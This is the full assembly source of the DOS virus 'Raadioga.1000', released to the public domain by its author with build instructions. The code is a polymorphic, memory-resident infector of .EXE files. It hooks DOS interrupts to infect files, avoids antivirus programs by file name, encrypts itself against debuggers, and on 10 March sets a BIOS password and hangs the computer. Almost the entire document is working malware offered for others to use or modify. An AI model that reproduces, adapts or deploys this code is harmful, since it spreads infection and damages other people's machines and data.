   ;Raadioga.1000 v1.0 24.Mar.1997 NiL
   ;
   ;Licence :]
   ;==============================================================================
   ;As this code has been around for about two years and is widely recognized by
   ;several AV utilities I decided to make it a public domain. So You can take it
   ;or leave it / modify it / use it for Your own purposes etc. If You wish to
   ;show respect to my work leave those magic letters NiL inside code. BTW this
   ;is not my pseudonym. It is rather a codename for my activity of producing
   ;these tiny self-replicating pieces of code. Have fun!
   ;
   ;Introduction
   ;==============================================================================
   ;Polymorphic memory resident .EXE infector for DOS executables. All .EXE files
   ;in current directory are infected on following Int21 calls:
   ;   ah,1Ah   Set DTA
   ;   ah,0Eh   Set default disk
   ;   ah,11h   Find first via file FCB
   ;   ax,713Bh Set default dir (Win95)
   ;The payload activates on the 10th of March. At this time it enables Award BIOS
   ;password, displays a message and enters an infinite loop. The code is quite
   ;bug-free, well-commented and highly optimized for size. Written on my
   ;ever-young 4.77MHz XT.
   ;
   ;Features You might find interesting
   ;==============================================================================
   ;Polymorphism
   ;  Quite a simple code-swapping algorithm. Enough to avoid pattern search.
   ;  The interesting thing about this feature is that it changes a portion of
   ;  decryption code according to infection date after each two weeks. This leads
   ;  to belief that the code is not polymorphic. (Thats why several versions
   ;  of AV utilities fail to find all the variations even nowadays. For example
   ;  the AV guys at Symantec seem to think that variations are some kind of
   ;  modifications of this virii :). Anyway the variation generated for example
   ;  on 24-Mar-1997 is quite different of a variation generated on 01-Jan-2000.
   ;
   ;Encryption
   ;  Stupid XOR/SUB/ADD encryption. When host is started the decryptor is
   ;  placed into Int8 (timer) interrupt handler and thus executed automatically
   ;  after a while - a problem for debuggers which enter into Int8 handler.
   ;  Even more - it is combined with a trick of modifing a jmp instruction
   ;  after handler execution which causes the waiting loop to terminate
   ;  jumping into middle of the same (modified jmp) instruction.
   ;  Confusing - maybe...
   ;
   ;Anti-debugging/anti-disassembling
   ;  As I wished to keep the size 1000 only some really simple features. Nothing
   ;  advanced like tunneling, running line etc.
   ;
   ;Multi-infection
   ;  With possibility of 3/64 infects a file multiple times.
   ;
   ;AV check on infection
   ;  Does not infect files starting with F-*, SC*, TB*, AV*, VI*, VS*.
   ;
   ;Stealth (?)
   ;  Sorry for calling it "Stealt" but do You always notice file size growth of
   ;  1000 bytes? The software does :-(
   ;
   ;Award BIOS password setting
   ;  Sets the necessary bits and recalculates checksum.
   ;
   ;FD write protection check.
   ;  Reads and tries to write back a sector using Int13 services.
   ;
   ;File Read-Only bit removal
   ;  Removes the R-bit when needed and sets back after the job is done.
   ;
   ;For further reading visit:
   ;==============================================================================
   ;http://www.avpve.com/viruses/r/raadioga.html
   ;http://www.datafellows.com/v-descs/raadioga.htm
   ;http://www.symantec.com/avcenter/venc/ebld/enc.cgi?vid=7542&lang=us
   ;
   ;Greetings
   ;==============================================================================
   ;to virii writers - keep up a good work & don't write harmful virii,
   ;to Wannabees for having an interest in something most people do not have:
   ;   Knowledge (no ironics),
   ;to AV people for earning their living in fighting our progs (no ironics),
   ;to VLAD for producing high-quality technical magazines,
   ;to Ralf Brown for his wonderful interrupt list,
   ;to creators of SoftIce, Sourcer, Hiew for magnificent tools,
   ;to all involved in the scene (Sorry, I think I'm going to leave the scene
   ;  soon).
   ;
   ;==============================================================================
   ;Here it comes and assembles using commands:
   ;tasm /m2 raadio10.asm
   ;tlink /t /x raadio10.obj
   .model  tiny
   .code
   org 100h

   ProgOfs equ offset @Crypt       ;De|encrytor offset
   VirSize equ @End-ProgOfs        ;Size of virus code
   CrySize equ @End-@Crted     ;Size of encrypted code
   DtaOfs  equ VirSize         ;Disk Transfer Area buffer offset
   BufOfs  equ DtaOfs+43       ;Encryption Buffer Offset
   BufSize equ VirSize+20h     ;Encryption Buffer Size
   AllSize equ BufOfs+BufSize      ;Size of code and buffer
   ;==============================================================================
   @Begin: jmp @Start
   ;==============================================================================
   @Crypt: mov di,(offset @End)-2  ;Encryption offset
       mov cx,CrySize/2        ;Size of code to crypt
       mov ax,0            ;Encryption key
   @CrNxt: xor ds:[di],ax      ;De|encrypt word
       nop             ;Placeholder
       add di,-2           ;Decrement pointer
       loop    @CrNxt          ;De|encrypt next word
   @CrRet: inc byte ptr ds:[di+1]  ;Set "Decryption done" flag
       iret                ;Return from int 08h handler
   ;------------------------------------------------------------------------------
   @Start: push    ds
       mov si,ProgOfs      ;Virus offset
       mov ax,3508h
       int 21h         ;Get interrupt 08h handler address
       push    cs
       pop ds
       mov dx,si
       mov ah,25h
       int 21h         ;Set our interrupt 08h handler

       db  0EBh            ;jmp $ - 2
   CrypFlg db  0FEh            ;Decrypt not yet done? (FEh->(FFh=dec))
   @Crted: db  4Ch         ;byte ptr [si+CrypFlg-ProgOfs]
       db  CrypFlg-ProgOfs

       db  0B8h,005h,0FEh,0EBh,0FCh
       add ax,3B05h        ;mov ax,2508h
       mov dx,bx
       push    es
       pop ds
       int 21h         ;Restore original interrupt 08h handler

       mov al,20h
       out 20h,al          ;EOI signal

       mov bp,si

       db  0B8h,005h,0FEh,0EBh,0FCh
       sub ax,0BF8Ch       ;mov ax,2A77h
       int 21h
       cmp ax,bx           ;Virus already resident?
       je  @Done
       cmp dx,030Ah
       je  @Spec           ;10th of March code

       pop es          ;Segment of programs PSP
       push    es
       sub di,di
       mov bx,es           ;Calculate address of programs MCB
       dec bx
       mov ds,bx

       sub word ptr ds:[di+03h],(AllSize+0Fh)/10h+1
       add bx,ds:[di+03h]      ;New size of programs memory block
       inc bx          ;Calculate address of viruses MCB
       mov es,bx
       mov al,'M'
       xchg    al,byte ptr ds:[di] ;Get/Set type of programs memory block

       stosb               ;Set type of viruses memory block
       mov ax,08h
       stosw               ;Set owner of viruses memory block (DOS)
       mov ax,(AllSize+0Fh)/10h
       stosw               ;Set size of viruses memory block

       inc bx
       mov es,bx
       sub di,di
       mov cx,(VirSize+1)/2
       push    cs
       pop ds
       rep movsw           ;Copy virus code to new memory block

       push    es
       mov si,21h*4
       mov di,03h*4
       push    di
       mov ds,cx
       mov es,cx
       movsw               ;Copy Int 21h on Int 03h
       movsw
       pop si
       pop es
       mov di,Ofs21-ProgOfs
       movsw               ;Get old Int 21h handler address
       movsw

       cli             ;Set our Int 21h handler
       mov word ptr ds:[21h*4],@New21-ProgOfs
       mov ds:[21h*4+2],es

   @Done:  pop es
       push    es
       pop ds

       mov ax,ds           ;Segment address of PSP
       add ax,10h          ;Add PSP size
       add cs:[bp+OldCS-ProgOfs],ax
       jmp @FlCue          ;Flush processur queue (for 486)
   @FlCue: db  05h         ;add ax,
   OldSS   dw  0           ;original ss
       cli
       mov ss,ax
       db  0BCh            ;mov sp,
   OldSP   dw  0           ;original sp
       sti
       db  0EAh            ;Jump to
   OldIP   dw  0           ;original IP
   OldCS   dw  0FFF0h          ;original CS
   ;==============================================================================
   @Spec:  mov al,11h          ;Award BIOS code
       out 70h,al
       in  al,71h          ;Read password settings
       mov bl,al
       or  bl,00000011b
       push    bx
       sub bl,al           ;Calculate difference to bl
       mov al,11h
       out 70h,al
       pop ax
       out 71h,al          ;Enable password for Setup and System

       mov al,2Fh
       out 70h,al
       in  al,71h          ;Read BIOS checksum
       add bl,al           ;Calculate new checksum into bl
       mov al,2Fh
       out 70h,al
       xchg    ax,bx
       out 71h,al          ;Save new checksum

       call    @Wr
       db  07h,'HAIGUSTE RAVI KONTROLLITUD VAIKUSE PIMEDUSE JA RAADIOGA$'
       db  'NiL'
   @Wr:    pop dx
       push    cs
       pop ds
       mov ah,09h
       int 21h
           cli
   @NoStop:jmp @NoStop                 ;Hang the computer
   ;==============================================================================
   @New21: cmp ah,1Ah          ;"Set DTA" service
       je  @DoIt
       cmp ah,0Eh          ;"Set default disk" service
       je  @DoIt
       cmp ah,11h          ;"Find first via file FCB" service
       je  @DoIt
       cmp ax,713Bh        ;"Set default dir" service (Win95)
       je  @DoIt
       cmp ax,2A77h        ;"Get DOS date" ("Are we resident?")
       je  @OurCl
   @Orig21:db  0EAh            ;Jump to original Int 21h handler
   Ofs21   dw  7777h
   Seg21   dw  7777h
   @OurCl: mov bx,ax
       iret
   ;------------------------------------------------------------------------------
   @DoIt:  push    ax bx cx dx si di ds es

       mov ah,19h
       int 03h         ;Get default drive specification to al
       cmp AL,1            ;Not drive A: or B:?
       ja  @NProt
       xchg    dx,ax           ;Move drivespec to dl
       sub dh,dh           ;Set drive.headspec to dh (dh:=0)
       mov ax,0201h        ;ah:=SubFn(Write); al:=Sector count
       mov cx,ax           ;ch:=Track(0-n); cl:=Sector(1-n)
       push    cs
       pop es          ;es:=cs
       mov bx,DtaOfs       ;Offset of buffer into bx
       int 13h         ;Read sector from disk to es:bx
       mov ax,0301h        ;ah:=SubFn(Write); al:=Sector count
       int 13h         ;Write same sector to same place
       jnc @NProt
       jmp @YProt
   ;------------------------------------------------------------------------------
   @NProt: mov ah,2Fh
       int 03h         ;Get DTA
       push    es bx           ;and store it

       push    cs
       pop ds
       mov dx,DtaOfs
       mov ah,1Ah
       int 03h         ;Set DTA

       mov dx,ExeMask-ProgOfs
       mov cx,7
       mov ah,4Eh
   @FndNxt:int 03h         ;Find first/next .EXE file
       jc  @DntInf

       mov si,DtaOfs+15h       ;Set si point to file attribute
       sub ax,ax
       cld
       lodsb               ;Get file attribute
       xchg    cx,ax           ;and store it into cl for later use

       lodsw               ;Get file time
       mov bx,ax
       and al,11100000b        ;Set FileTime.Sec=34
       or  al,00010001b        ;to indicate infection
       cmp ax,bx           ;File already possibly infected?
       je  @NThis

       mov cs:[FlTime-ProgOfs],ax
       lodsw               ;Get file date
       mov cs:[FlDate-ProgOfs],ax
       lodsw
       lodsw               ;Get High(FileSize)
       cmp ax,7            ;File smaller than 589824?
       ja  @NThis
       mov dx,si           ;Store offset of 13-byte filespec

       lodsw
       push    cs
       pop es
       mov di,AVir-ProgOfs
       mov cx,(@Infect-AVir)/2
   @NxtAv: scasw               ;Is it Anti-Virus?
       je  @NThis
       loop    @NxtAv

       mov bx,cx           ;Copy file attribute into bx
       and cl,0FEh         ;Strip "Read-only" bit
       cmp cl,bl           ;File not "Read-only"?
       je  @NROnly

       mov ax,4301h
       int 03h         ;Set file to not "Read-only"
       jc  @NThis
       stc             ;Set "File was Read-only" flag

   @NROnly:pushf
       push    dx bx

       mov ax,3D02h
       int 03h         ;Open file for reading/writing
       jc  @OpnErr         ;Operation not successful
       xchg    bx,ax           ;File handle into bx

       call    @Infect         ;Call "Infect file" procedure

   @OpnErr:pop cx dx
       popf
       jnc @NThis          ;"File was Read-only" flag not set

       mov ax,4301h
       int 03h         ;Restore original file attributes

   @NThis: mov dx,DtaOfs
       mov ah,4Fh
       jmp @FndNxt         ;Find next .EXE file

   @DntInf:pop dx ds
       mov ah,1Ah
       int 03h         ;Restore original DTA

   @YProt: pop es ds di si dx cx bx ax
       jmp @Orig21         ;Jump to original Int 21h

   ExeMask db  '*.EXE',0
   AVir    db  'F-SCTBAVVIVS'
   ;=============================================================================
   @Infect:mov cx,1Ah
       mov dx,BufOfs
       mov di,dx
       mov ah,3Fh
       int 03h         ;Read file header into buffer (ds:dx)
       cmp byte ptr ds:[di+18h],40h
       je  @BdFile         ;Windows executable

       mov ax,4202h
       sub cx,cx
       cwd
       int 03h         ;Seek EOF, get filesize into dx:ax

       push    ax dx
       mov cx,512
       div cx          ;Calculate 512-byte page count
       or  dx,dx           ;No partial page?
       jz  @NoPart
       inc ax          ;Page for partial page too
   @NoPart:cmp ds:[di+04h],ax      ;Page count ok?
       je  @PCntOk
   @BdSize:pop dx ax
   @BdFile:jmp @Close
   @PCntOk:cmp ds:[di+02h],dx      ;Size of partial page ok?
       jne @BdSize
       pop dx ax

       push    ax
       mov cx,4
   @LDiv:  shr dx,1            ;Divide FileSize by 16
       rcr ax,1
       loop    @LDiv
       sub ax,ds:[di+08h]      ;Subtract HeaderSize/16

       pop dx
       and dx,0Fh          ;Strip high bits to calculate ip
       mov si,dx           ;Store new ip (used later in encryption)

       add dl,@Start-ProgOfs

       push    ax
       xchg    ds:[di+0Eh],ax      ;Exchange header ss
       mov ds:[OldSS-ProgOfs],ax
       pop ax
       xchg    ds:[di+16h],ax      ;Exchange header cs
       mov ds:[OldCS-ProgOfs],ax
       xchg    ds:[di+14h],dx      ;Exchange header ip
       mov ds:[OldIP-ProgOfs],dx
       mov ax,8FFEh
       xchg    ds:[di+10h],ax      ;Exchange header sp
       mov ds:[OldSP-ProgOfs],ax

       mov ax,ds:[di+02h]      ;Calculate new filesize
       add ax,VirSize MOD 512
       cmp ax,512
       jb  @NoCr
       sub ax,512
       inc word ptr ds:[di+04h]
   @NoCr:  mov ds:[di+02h],ax
       inc word ptr ds:[di+04h]    ;NB! (512 >= VirSize > 1024)

       mov ax,ds:[di+0Ah]      ;Minimum memory required
       add ax,(AllSize+0Fh)/10h+1
       jc  @BdFile
   @MinOk: cmp ds:[di+0Ch],ax      ;Maximum memory required
       jbe @BdFile
       mov ds:[di+0Ah],ax

       push    bx
       call    @Engine         ;Generate Cryptor
       call    @Crypt          ;Encrypt virus in buffer
       pop bx

       mov cx,VirSize
       mov dx,BufOfs+18h
       mov ah,40h
       int 03h         ;Write virus to end of file
       jc  @Close

       mov ax,4200h
       sub cx,cx
       cwd
       int 03h         ;Seek beginning of file

       mov cx,18h
       mov dx,BufOfs
       mov ah,40h
       int 03h         ;Write new header to file

       in  al,40h          ;Make multi-infection possible
       cmp al,11           ;Possibility=(3/64)
       ja  @Close
       inc word ptr ds:[FlTime-ProgOfs]

   @Close: mov ax,5701h
       db  0B9h            ;mov cx,
   FlTime  dw  0           ;modified FileTime
       db  0BAh            ;mov dx,
   FlDate  dw  0           ;FileDate
       int 03h         ;Restore file modification date/time

       mov ah,3Eh
       int 03h         ;Close file
       retn
   ;==============================================================================
   xor_dsdi    equ 031h
   add_dsdi    equ 001h
   sub_dsdi    equ 029h
   inc_ax      equ 040h
   dec_ax      equ 048h
   inc_byte_ptr    equ 0FEh
   inc_word_ptr    equ 0FFh
   dssi        equ 02744h
   dsdi        equ 00145h
   push_ds     equ 01Eh
   push_es     equ 006h
   int_21      equ 021CDh
   push_cs_pop_ds  equ 01F0Eh
   mov_dx_si   equ 0D68Bh
   mov_ah_25   equ 025B4h
   mov_di      equ 0BFh
   retn_       equ 0C3h

   mov_di_COfs db  mov_di
   CrypOfs     dw  0
   mov_cx_CSiz db  0B9h
   CrypSiz     dw  CrySize/2
   mov_ax_CVal db  0B8h
   CrypVal     dw  0
   dec_di_jnz  db  04Fh,04Fh,049h,075h,0F8h
   add_di_lop  db  083h,0C7h,0FEh,0E2h,0F8h
   sub_di_lop  db  083h,0EFh,002h,0E2h,0F8h
   mov_ax_3508 db  0B8h,008h,035h
   mov_si_VOfs db  0BEh
   VirOfs      dw  0
   ;------------------------------------------------------------------------------
   @Engine:push    ds
       pop es
       sub di,di
       mov word ptr ds:[VirOfs-ProgOfs],si
       add si,(@End-2)-ProgOfs ;Calculate offset of crypted area end
       mov word ptr ds:[CrypOfs-ProgOfs],si
       in  al,40h          ;Get random number
       mov ah,al
       in  al,40h
       mov word ptr ds:[CrypVal-ProgOfs],ax
       mov ah,2Ah
       int 03h         ;Get DOS date cx-year;dh-month;dl-day

       inc dh          ;Calculate seed
       mov cl,3
       shl dl,cl
       shl dx,1
       shr cl,1
       rcl dh,1
       ror dh,1            ;Seed in form: Y00MMMMD

       mov si,mov_di_COfs - ProgOfs
       mov ax,mov_cx_CSiz - ProgOfs
       mov bx,mov_ax_CVal - ProgOfs
       ror dh,1            ;DY00MMMM
       jc  @1_1
       xchg    si,ax
   @1_1:   ror dh,1            ;MDY00MMM
       jc  @1_2
       xchg    si,bx
   @1_2:   ror dh,1            ;MMDY00MM
       jc  @1_3
       xchg    ax,bx
   @1_3:   movsb
       movsw
       xchg    si,ax
       movsb
       movsw
       xchg    si,bx
       movsb
       movsw
                       ;Choose encryption method
       mov al,xor_dsdi
       ror dh,1            ;MMMDY00M
       jc  @2_1
       mov al,add_dsdi
   @2_1:   ror dh,1            ;MMMMDY00
       jc  @2_2
       mov al,sub_dsdi
   @2_2:   stosb
       inc di
                       ;Choose key manipulation
       mov al,inc_ax
       rol dh,1            ;MMMDY00M
       jc  @2_3
       mov al,dec_ax
   @2_3:   stosb
                       ;Choose looping method
       mov si,dec_di_jnz - ProgOfs
       rol dh,1            ;MMDY00MM
       jc  @3_1
       mov si,add_di_lop - ProgOfs
   @3_1:   rol dh,1            ;MDY00MMM
       jc  @3_2
       mov si,sub_di_lop - ProgOfs
   @3_2:   movsw
       movsw
       movsb
                       ;Choose increment operand size
       mov al,inc_byte_ptr
       rol dh,1            ;DY00MMMM
       jc  @4_1
       mov al,inc_word_ptr
   @4_1:   stosb
                       ;Choose increment operand
       mov ax,dssi
       rol dh,1            ;Y00MMMMD
       jc  @4_2
       mov ax,dsdi
   @4_2:   stosw
       inc di
                       ;Choose PSP register to save
       mov al,push_ds
       rol dh,1            ;00MMMMDY
       jc  @5_1
       mov al,push_es
   @5_1:   stosb
                       ;Swap pre-GetIntVec code
       mov si,mov_ax_3508 - ProgOfs
       mov ax,mov_si_VOfs - Progofs
       ror dh,1            ;Y00MMMMD
       jc  @6_1
       xchg    si,ax
   @6_1:   movsb
       movsw
       xchg    si,ax
       movsb
       movsw
                       ;Swap miscellaneous code
       mov ax,int_21
       mov bx,push_cs_pop_ds
       call    Swap            ;DY00MMMM
                       ;Swap pre-SetIntVec code
       mov ax,mov_dx_si
       mov bx,mov_ah_25
       call    Swap            ;MDY00MMM

       mov di,BufOfs+18h
       mov cx,(VirSize+1)/2
       sub si,si
       rep movsw           ;Copy virus to buffer

       mov di,0FFFEh
       mov al,mov_di
   @Next:  inc di
       inc di
       scasb
       jne @Next           ;"mov di" command found
       mov word ptr ds:[di],(BufOfs+18h)+((@End-2)-ProgOfs)
                       ;Swap "sub|add" in encryptor
       mov di,@CrNxt-ProgOfs
       mov ax,(sub_dsdi shl 8)+add_dsdi
       cmp ds:[di],al
       jne @NoAdd
       mov ds:[di],ah
       jmp @NoSub
   @NoAdd: cmp ds:[di],ah
       jne @NoSub
       stosb

   @NoSub: mov byte ptr ds:[@CrRet-ProgOfs],retn_
       retn
   ;------------------------------------------------------------------------------
   Swap:   ror dh,1
       jc  @s_1
       xchg    ax,bx
   @s_1:   stosw
       xchg    ax,bx
       stosw
       retn
   ;==============================================================================
   @End:   end @Begin
